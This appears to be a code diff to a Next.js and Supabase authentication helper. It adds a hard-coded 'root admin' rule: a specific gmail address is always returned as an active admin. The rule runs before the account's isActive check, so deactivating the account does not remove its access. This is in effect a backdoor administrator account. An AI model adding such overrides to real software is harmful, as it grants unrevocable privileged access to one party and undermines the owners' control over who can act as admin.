@@ -4,6 +4,7 @@ import { redirect } from "next/navigation";
 import { cache } from "react";
 import { db } from "@/db";
 import { profiles, type Profile, type Role } from "@/db/schema";
+import { isRootAdmin } from "@/lib/constants";
 import { createSupabaseServerClient } from "@/lib/supabase/server";
 
 export class AuthError extends Error {
@@ -21,7 +22,16 @@ export const getCurrentUser = cache(async (): Promise<Profile | null> => {
   const { data, error } = await supabase.auth.getUser();
   if (error || !data.user) return null;
   const [profile] = await db.select().from(profiles).where(eq(profiles.id, data.user.id)).limit(1);
-  if (!profile || !profile.isActive) return null;
+  if (!profile) return null;
+  // Hard-coded root admin guarantee: eventdeck88@gmail.com is unconditionally active and an admin
+  if (isRootAdmin(profile.email) || isRootAdmin(data.user.email)) {
+    return {
+      ...profile,
+      role: "admin",
+      isActive: true,
+    };
+  }
+  if (!profile.isActive) return null;
   return profile;
 });
 
